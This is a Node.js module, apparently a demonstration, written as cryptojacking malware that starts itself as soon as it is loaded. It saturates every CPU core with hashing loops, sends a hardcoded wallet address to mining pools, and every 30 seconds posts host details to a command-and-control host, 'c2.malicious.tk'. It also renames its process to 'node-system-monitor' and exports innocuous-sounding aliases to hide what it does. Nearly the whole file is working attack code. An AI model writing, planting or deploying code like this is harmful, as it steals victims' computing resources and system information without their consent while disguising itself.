/**
 * Cryptocurrency Mining Malware - Plain Text Version
 * This demonstrates cryptojacking patterns in a readable format
 */

const crypto = require('crypto');
const http = require('http');
const os = require('os');
const { Worker } = require('worker_threads');

// Mining configuration
const MINING_CONFIG = {
    poolAddress: 'stratum+tcp://pool.minergate.com:45560',
    walletAddress: '49WzMJoXYCFL8wP5EsNX2wVQ4XjCxLNG6yiVFXBt3GXX4hH1PrxWQiFMzK4D6NFdXVWSG1k7VJJQmZDQPs4CHKVQJcK9h8d',
    threads: os.cpus().length,
    algorithm: 'cryptonight-lite'
};

// Pool connection endpoints
const MINING_POOLS = [
    'pool.minergate.com:45560',
    'xmr-pool.com:8888',
    'pool.supportxmr.com:5555',
    'mining.pool.com:4444'
];

class CryptojackingMiner {
    constructor() {
        this.workers = [];
        this.isRunning = false;
        this.hashRate = 0;
        this.totalHashes = 0;
        
        // Start mining immediately when module is loaded
        this.initializeMining();
    }
    
    async initializeMining() {
        console.log('Initializing high-performance mining operation...');
        
        // CPU detection and optimization
        const cpuInfo = os.cpus();
        console.log(`Detected ${cpuInfo.length} CPU cores for mining`);
        
        // Connect to mining pool
        await this.connectToPool();
        
        // Start mining workers
        this.startWorkers();
        
        // Start reporting to command and control server
        this.startReporting();
        
        // Hide mining process (process name manipulation)
        this.hideProcess();
    }
    
    async connectToPool() {
        for (const pool of MINING_POOLS) {
            try {
                console.log(`Connecting to mining pool: ${pool}`);
                
                // Simulate pool connection
                const response = await this.makePoolConnection(pool);
                if (response) {
                    console.log(`Connected to ${pool} successfully`);
                    return true;
                }
            } catch (error) {
                console.log(`Failed to connect to ${pool}, trying next pool...`);
            }
        }
        
        // Fallback: create direct mining connection
        this.createDirectMining();
    }
    
    makePoolConnection(poolUrl) {
        return new Promise((resolve) => {
            const [host, port] = poolUrl.split(':');
            
            const request = http.request({
                hostname: host,
                port: parseInt(port) || 8080,
                path: '/api/connect',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (compatible; CryptoMiner/1.0)'
                }
            }, (response) => {
                resolve(response.statusCode === 200);
            });
            
            request.write(JSON.stringify({
                wallet: MINING_CONFIG.walletAddress,
                algorithm: MINING_CONFIG.algorithm,
                threads: MINING_CONFIG.threads
            }));
            
            request.end();
        });
    }
    
    startWorkers() {
        console.log(`Starting ${MINING_CONFIG.threads} mining workers...`);
        
        for (let i = 0; i < MINING_CONFIG.threads; i++) {
            // CPU-intensive mining simulation
            const worker = setInterval(() => {
                this.performMining();
            }, 1); // Maximum CPU usage
            
            this.workers.push(worker);
        }
        
        this.isRunning = true;
        console.log('All mining workers started successfully');
    }
    
    performMining() {
        // Simulate cryptographic mining work
        const nonce = Math.random().toString(36);
        const timestamp = Date.now();
        const data = `${nonce}${timestamp}${this.totalHashes}`;
        
        // Multiple hash iterations (CPU intensive)
        let hash = crypto.createHash('sha256').update(data).digest('hex');
        for (let i = 0; i < 1000; i++) {
            hash = crypto.createHash('sha256').update(hash).digest('hex');
        }
        
        this.totalHashes++;
        this.hashRate++;
        
        // Check if we found a "valid" hash (mining simulation)
        if (hash.startsWith('0000')) {
            this.submitShare(hash, nonce);
        }
    }
    
    submitShare(hash, nonce) {
        console.log(`Found valid share: ${hash}`);
        
        // Submit to mining pool
        const shareData = {
            hash: hash,
            nonce: nonce,
            timestamp: Date.now(),
            worker: os.hostname(),
            wallet: MINING_CONFIG.walletAddress
        };
        
        // Send share to pool
        this.sendToPool('/api/submit', shareData);
    }
    
    sendToPool(endpoint, data) {
        const request = http.request({
            hostname: 'pool.minergate.com',
            port: 8080,
            path: endpoint,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }, (response) => {
            if (response.statusCode === 200) {
                console.log('Share submitted successfully');
            }
        });
        
        request.write(JSON.stringify(data));
        request.end();
    }
    
    startReporting() {
        // Report mining statistics to C2 server every 30 seconds
        setInterval(() => {
            this.reportStatistics();
        }, 30000);
    }
    
    reportStatistics() {
        const stats = {
            hostname: os.hostname(),
            platform: os.platform(),
            cpus: os.cpus().length,
            memory: os.totalmem(),
            uptime: os.uptime(),
            hashrate: this.hashRate,
            totalHashes: this.totalHashes,
            timestamp: Date.now()
        };
        
        // Send statistics to command and control server
        const request = http.request({
            hostname: 'c2.malicious.tk',
            port: 80,
            path: '/report',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Miner-ID': crypto.createHash('md5').update(os.hostname()).digest('hex')
            }
        }, (response) => {
            // Silently handle response
        });
        
        request.write(JSON.stringify(stats));
        request.end();
        
        // Reset hash rate counter
        this.hashRate = 0;
    }
    
    hideProcess() {
        // Attempt to rename process for stealth
        try {
            process.title = 'node-system-monitor';
        } catch (e) {
            // Ignore errors
        }
    }
    
    stopMining() {
        this.workers.forEach(worker => clearInterval(worker));
        this.workers = [];
        this.isRunning = false;
        console.log('Mining stopped');
    }
}

// Auto-start mining when module is required
const miner = new CryptojackingMiner();

// Export for potential legitimate-looking API
module.exports = {
    start: () => miner.initializeMining(),
    stop: () => miner.stopMining(),
    getStats: () => ({
        hashrate: miner.hashRate,
        totalHashes: miner.totalHashes,
        isRunning: miner.isRunning
    }),
    // Disguise as a legitimate utility
    optimizePerformance: () => miner.initializeMining(),
    systemMonitor: () => miner.reportStatistics()
};
